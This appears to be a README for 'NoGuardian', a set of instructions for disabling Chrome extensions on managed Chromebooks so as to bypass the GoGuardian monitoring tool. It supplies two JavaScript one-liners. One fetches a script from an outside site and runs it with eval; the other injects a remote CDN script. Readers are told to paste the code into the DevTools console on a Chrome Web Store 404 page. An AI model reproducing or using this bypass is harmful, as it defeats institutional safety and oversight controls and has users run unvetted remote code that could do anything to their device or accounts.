# noguardian
Exploit to Disable Chrome Extentions (to Bypass GoGuardian)

# NoGuardian ChomeBook Bypass

Here are the steps to exploit to ChromeBook Extensions (to Bypass GoGuardian)

UPDATE: JUST GO HERE: https://tylerhalltech.com/noguardian or here: https://tylerhalltech.com/noguardian2/

## 1) PREPARE EXPLOIT
Copy the code here:

## Code #1
```
fetch(`https://tylerhalltech.com/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```

## Code #2 (BETTER THAN #1)
```
(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
```


## 2) LOAD 404 PAGE

Go to `https://chrome.google.com/webstore_`

Press Ctrl + Shift + I on the 404 page to open Chrome's Developer Tools.

Go to the CONSOLE tab

Paste the code from step 1 here and press enter

You should now be able to disable any Google Chrome extension (including GoGuardian)
